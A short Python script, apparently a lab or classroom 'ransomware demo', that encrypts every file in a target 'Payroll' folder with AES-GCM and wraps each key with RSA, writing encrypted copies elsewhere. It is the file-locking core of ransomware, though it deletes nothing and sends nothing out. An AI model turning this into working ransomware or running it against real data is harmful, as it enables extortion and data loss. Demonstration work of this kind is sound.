#from cryptography.hazmat.primitives.asymmetric import rsa
#
#def generate_keys():
#    # Generate RSA private key
#    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
#    # Generate corresponding public key
#    public_key = private_key.public_key()

import os
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def encrypt_folder(folder_path, public_key_path):
    folder = Path(folder_path)
    output_folder = folder.parent / (folder.name + "_Encrypted")

    # Load RSA public key
    with open(public_key_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(key_file.read())

    # Create output directory
    output_folder.mkdir(exist_ok=True)

    # Walk through all folders and files recursivly
    for root, dirs, files in os.walk(folder):
        #Perserving folder structure
        relative_path = Path(root).relative_to(folder)
        encrypted_dir = output_folder / relative_path
        encrypted_dir.mkdir(parents=True, exist_ok=True)

        for filename in files:
            file_path = Path(root) / filename

            # Generate random AES key and nonce
            aes_key = AESGCM.generate_key(bit_length=256)
            nonce = os.urandom(12)

            # Read original file in binary
            with open(file_path, "rb") as file:
                data = file.read()

            # Encrypt file using AES-GCM
            aesgcm = AESGCM(aes_key)
            encrypted_data = aesgcm.encrypt(nonce, data, None)

            # Encrypt AES key using RSA
            encrypted_key = public_key.encrypt(aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))

            # Save encrypted file
            output_path = encrypted_dir / (filename + ".enc")
            #Instructions for decryption
            with open(output_path, "wb") as encrypted_file:
                # Store encrypted AES key, nonce and encrypted data
                encrypted_file.write(len(encrypted_key).to_bytes(2, "big"))
                encrypted_file.write(encrypted_key)
                encrypted_file.write(nonce)
                encrypted_file.write(encrypted_data)

    print("Folder encryption complete!")
    print("Encrypted folder:", output_folder)


# Main program
if __name__ == "__main__":

    #folder = input("Enter folder path: ")
    folder = "C:/Users/EvanW/Desktop/Ransomware demo/Target/Payroll"
    #public_key = input("Enter public key path: ")
    public_key = "C:/Users/EvanW/Desktop/Ransomware demo/Keys/public_key.pem"

    try:
        encrypt_folder(folder, public_key)

    except Exception as error:
        print("Error:", error)
